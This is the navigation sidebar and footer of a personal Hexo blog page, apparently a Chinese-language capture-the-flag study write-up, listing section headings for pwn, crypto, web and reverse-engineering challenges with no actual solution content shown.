class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn1-asm"><span class="nav-number">2.1.</span> <span class="nav-text">pwn1-asm</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-4"><span class="nav-number">2.1.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-4"><span class="nav-number">2.1.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn2-ret"><span class="nav-number">2.2.</span> <span class="nav-text">pwn2-ret</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-5"><span class="nav-number">2.2.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-5"><span class="nav-number">2.2.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn3-normal-pwn"><span class="nav-number">2.3.</span> <span class="nav-text">pwn3-normal pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-6"><span class="nav-number">2.3.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-6"><span class="nav-number">2.3.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn4-no-fmtstr"><span class="nav-number">2.4.</span> <span class="nav-text">pwn4-no_fmtstr</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-7"><span class="nav-number">2.4.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-7"><span class="nav-number">2.4.2.</span> <span class="nav-text">收获</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto1-%E4%B8%8D%E5%B0%8F%E5%BF%83"><span class="nav-number">3.1.</span> <span class="nav-text">crypto1-不小心</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-8"><span class="nav-number">3.1.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-8"><span class="nav-number">3.1.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto2-justmath"><span class="nav-number">3.2.</span> <span class="nav-text">crypto2-justmath</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-9"><span class="nav-number">3.2.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-9"><span class="nav-number">3.2.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto3-base"><span class="nav-number">3.3.</span> <span class="nav-text">crypto3-base</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-10"><span class="nav-number">3.3.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-10"><span class="nav-number">3.3.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto4-easy-crypto1"><span class="nav-number">3.4.</span> <span class="nav-text">crypto4-easy_crypto1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-11"><span class="nav-number">3.4.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-11"><span class="nav-number">3.4.2.</span> <span class="nav-text">收获</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">4.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#web1-input-data"><span class="nav-number">4.1.</span> <span class="nav-text">web1-input_data</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-12"><span class="nav-number">4.1.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-12"><span class="nav-number">4.1.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web2-admin"><span class="nav-number">4.2.</span> <span class="nav-text">web2-admin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-13"><span class="nav-number">4.2.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-13"><span class="nav-number">4.2.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web3-flask"><span class="nav-number">4.3.</span> <span class="nav-text">web3-flask</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-14"><span class="nav-number">4.3.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-14"><span class="nav-number">4.3.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web4-FLAG"><span class="nav-number">4.4.</span> <span class="nav-text">web4-FLAG</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-15"><span class="nav-number">4.4.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-15"><span class="nav-number">4.4.2.</span> <span class="nav-text">收获</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">5.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#re1-ez-apk"><span class="nav-number">5.1.</span> <span class="nav-text">re1-ez_apk</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-16"><span class="nav-number">5.1.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-16"><span class="nav-number">5.1.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#re2-%E6%9C%BA%E5%99%A8%E7%8C%AB"><span class="nav-number">5.2.</span> <span class="nav-text">re2-机器猫</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-17"><span class="nav-number">5.2.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-17"><span class="nav-number">5.2.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#re3-%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="nav-number">5.3.</span> <span class="nav-text">re3-文件分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-18"><span class="nav-number">5.3.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-18"><span class="nav-number">5.3.2.</span> <span class="nav-text">收获</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#re4-CSMazeee"><span class="nav-number">5.4.</span> <span class="nav-text">re4-CSMazeee</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4-19"><span class="nav-number">5.4.1.</span> <span class="nav-text">步骤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B6%E8%8E%B7-19"><span class="nav-number">5.4.2.</span> <span class="nav-text">收获</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="CTF-DUAN"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">CTF-DUAN</p>
  <div class="site-description" itemprop="description">CTF学习</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">3</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CTF-DUAN</span>
</div>

<!--
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>  -->

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
